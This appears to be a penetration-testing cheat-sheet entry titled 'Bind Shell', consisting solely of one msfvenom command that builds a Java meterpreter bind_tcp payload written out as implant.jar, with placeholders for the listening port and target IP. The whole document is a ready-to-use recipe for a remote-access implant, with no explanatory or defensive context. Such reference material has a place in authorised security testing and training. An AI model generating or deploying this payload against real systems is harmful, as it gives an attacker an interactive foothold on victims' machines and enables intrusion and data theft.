# Bind Shell

```
$ msfvenom -p java/meterpreter/bind_tcp lport=<PORT> [rhost=<target_IP>] -f raw -o implant.jar
```